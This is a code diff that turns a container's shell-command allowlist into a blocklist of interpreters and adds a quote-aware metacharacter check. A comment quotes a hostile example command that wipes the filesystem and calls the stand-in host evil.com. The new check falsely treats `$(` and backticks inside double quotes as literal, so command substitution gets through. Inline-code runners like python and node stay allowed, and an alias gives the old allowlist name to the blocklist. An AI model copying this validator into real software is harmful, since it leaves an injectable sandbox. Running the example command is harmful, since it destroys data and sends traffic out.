@@ -9,68 +9,35 @@
 // ─── Shell Validation Constants ────────────────────────────────
 
 /**
- * Allowlisted commands (same as host shell-allowlist.ts).
- * These are safe to run inside the container with minimal privileges.
+ * Blocklisted shell interpreters.
+ *
+ * These can execute arbitrary strings (e.g. `bash -c "rm -rf / ; curl evil.com"`),
+ * bypassing the metacharacter check on the outer command. All other binaries
+ * are allowed — the container itself (read-only rootfs, network policy, cap-drop,
+ * pid/mem limits) is the security boundary.
+ *
+ * Note: SHELL_ALLOWLIST is exported as a deprecated alias for backward compatibility in tests.
  */
-export const SHELL_ALLOWLIST = new Set([
-  // Core utilities
-  'echo',
-  'cat',
-  'head',
-  'tail',
-  'wc',
-  'grep',
-  'sort',
-  'uniq',
-  'cut',
-  'awk',
-  'sed',
-  'tee',
-  'xargs',
-  'tr',
-  'diff',
-  'touch',
-  'chmod',
-
-  // File operations
-  'ls',
-  'pwd',
-  'mkdir',
-  'cp',
-  'mv',
-  'rm',
-  'find',
-  'date',
-
-  // Archive
-  'tar',
-  'gzip',
-  'gunzip',
-  'zip',
-  'unzip',
-
-  // Version control
-  'git',
-
-  // Network (for provenance tagging)
-  'curl',
-  'wget',
-  'jq',
-
-  // Runtime (container-isolated, needed for SDK-based skills)
-  'node',
-  'npm',
-  'npx',
-  'python',
-  'python3',
-  'pip',
-  'pip3',
-
-  // System info
-  'uname',
-  'whoami',
-  'id',
+export const SHELL_BLOCKLIST = new Set([
+  'bash',
+  'sh',
+  'dash',
+  'zsh',
+  'csh',
+  'tcsh',
+  'ksh',
+  'fish',
+  // Script interpreters that accept -e/-c style inline code
+  'perl',
+  'ruby',
+  'lua',
+  'tclsh',
 ]);
+
+/**
+ * @deprecated Use SHELL_BLOCKLIST instead. Kept for test backward compatibility.
+ */
+export const SHELL_ALLOWLIST = SHELL_BLOCKLIST;
 
 export const NETWORK_COMMANDS = new Set(['curl', 'wget', 'git', 'npm', 'npx', 'pip', 'pip3']);
 
@@ -81,14 +48,17 @@ export const NETWORK_COMMANDS = new Set(['curl', 'wget', 'git', 'npm', 'npx', 'p
 export const CONTROL_OPERATORS_RE = /\|\||&&/;
 
 /**
- * Injection-capable shell metacharacters.
+ * Check if a command contains dangerous metacharacters in unquoted regions.
  *
- * Blocked:
- * - `;`  — command chaining (bypasses pipeline allowlist validation)
+ * Walks the string tracking single/double quote state. Only flags:
+ * - `;`  — command chaining (bypasses per-segment validation)
  * - `` ` `` — command substitution
  * - `$(` — command substitution
  *
- * Allowed (safe in sandboxed container with command allowlist):
+ * These are safe inside quotes (shell treats them as literal characters),
+ * so commands like `python3 -c "import x; print()"` are allowed.
+ *
+ * Allowed everywhere (safe in sandboxed container with blocklist + isolation):
  * - `>`, `<` — file redirections (container has read-only rootfs, writable workspace only)
  * - `&` — background/stderr redirect `2>&1` (pid-limited container)
  * - `\` — escape sequences in grep patterns etc.
@@ -96,7 +66,43 @@ export const CONTROL_OPERATORS_RE = /\|\||&&/;
  * - `!` — history expansion (non-interactive shell, no effect)
  * - `$` alone — variable reference (`$?`, `$HOME`) is safe
  */
-export const DANGEROUS_METACHAR_RE = /[;`]|\$\(/;
+export function hasDangerousUnquotedMetachars(command: string): boolean {
+  let inSingleQuote = false;
+  let inDoubleQuote = false;
+  let escapeNext = false;
+
+  for (let i = 0; i < command.length; i++) {
+    const ch = command[i] as string;
+
+    if (escapeNext) {
+      escapeNext = false;
+      continue;
+    }
+
+    if (ch === '\\' && !inSingleQuote) {
+      escapeNext = true;
+      continue;
+    }
+
+    if (ch === "'" && !inDoubleQuote) {
+      inSingleQuote = !inSingleQuote;
+      continue;
+    }
+
+    if (ch === '"' && !inSingleQuote) {
+      inDoubleQuote = !inDoubleQuote;
+      continue;
+    }
+
+    // Only check metacharacters in unquoted regions
+    if (!inSingleQuote && !inDoubleQuote) {
+      if (ch === ';' || ch === '`') return true;
+      if (ch === '$' && command[i + 1] === '(') return true;
+    }
+  }
+
+  return false;
+}
 
 // ─── Types ───────────────────────────────────────────────────────
 
@@ -193,7 +199,7 @@ export function splitOnUnquotedPipe(command: string): string[] {
 // ─── Shell Pipeline Validation ───────────────────────────────────
 
 /**
- * Validate all commands in a pipeline against the allowlist.
+ * Validate all commands in a pipeline against the blocklist.
  * Splits on single `|` and checks each segment's first token.
  *
  * Rejects: control operators (||, &&), dangerous metacharacters,
@@ -213,8 +219,8 @@ export function splitOnUnquotedPipe(command: string): string[] {
  * // { ok: true, hasNetwork: false }
  */
 export function validatePipeline(command: string): PipelineValidationResult {
-  // Reject injection-capable metacharacters
-  if (DANGEROUS_METACHAR_RE.test(command)) {
+  // Reject injection-capable metacharacters in unquoted regions
+  if (hasDangerousUnquotedMetachars(command)) {
     return { ok: false, error: 'Command contains disallowed metacharacters', hasNetwork: false };
   }
 
@@ -237,10 +243,10 @@ export function validatePipeline(command: string): PipelineValidationResult {
 
   for (const segment of segments) {
     const cmd = segment.split(/\s+/)[0]?.replace(/^.*\//, '') ?? '';
-    if (!SHELL_ALLOWLIST.has(cmd)) {
+    if (SHELL_BLOCKLIST.has(cmd)) {
       return {
         ok: false,
-        error: `Command not allowed: ${cmd}. Allowed: ${[...SHELL_ALLOWLIST].join(', ')}`,
+        error: `Shell interpreter not allowed: ${cmd}. Use commands directly instead of wrapping in ${cmd} -c.`,
         hasNetwork: false,
       };
     }
